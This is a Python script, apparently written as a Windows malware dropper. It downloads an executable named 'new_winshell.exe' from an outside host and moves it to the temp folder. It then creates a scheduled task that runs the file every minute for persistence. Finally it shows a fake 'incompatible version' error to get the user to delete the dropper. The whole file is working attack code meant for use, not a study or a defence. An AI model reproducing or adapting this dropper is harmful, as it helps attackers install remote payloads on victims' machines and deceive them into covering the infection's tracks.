#Dropped that will download file from pastebin & schedule it to execute to gain persistence
#can be modified to grab xml file from pastebin & execute SCHTASKS with that SCHTASKS /XML /file-path
import subprocess
import requests
import tkinter as tk
from tkinter import ttk

#dropper exe file link here
url = 'https://notabug.org/megeyif969/pearlMountains/raw/master/new_winshell.exe'
#payload exe file name
payloadName = 'new_winshell.exe'
#dropper file name
dropperName = 'dropper.exe'
try:
    rqst = requests.get(url)
    with open(payloadName, "wb") as file:
        file.write(rqst.content)
    subprocess.check_output("move " + payloadName + " " + "%TMP%", shell=True)
    subprocess.check_output("cd %TMP% && SCHTASKS /CREATE /TN Win32start /SC MINUTE /TR %TMP%\\" + payloadName + " /ST 10:00", shell=True)
except:
    print("An unexpected error has occurred...exiting")

# This code will generate a popup to persuade user to delete
# dropper file since I can't figure out how to make the 
# dropper file delete itself
def popup():
    wd = subprocess.check_output("dir /s/b " + dropperName, shell=True)
    msg = "The version of this file is not compatible with the version of Windows you're running. Check \nyour computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit)\n version of the program, and then contact the software publisher."
    small = ("Verdana", 8)
    popup = tk.Tk()
    popup.wm_title(wd)
    popup.geometry("600x90")
    label = ttk.Label(popup, text=msg, font=small)
    label.pack(side="top", padx=10, pady=10)
    b1 = ttk.Button(popup, text="Ok", command = popup.destroy)
    b1.pack()
    popup.mainloop()
popup()
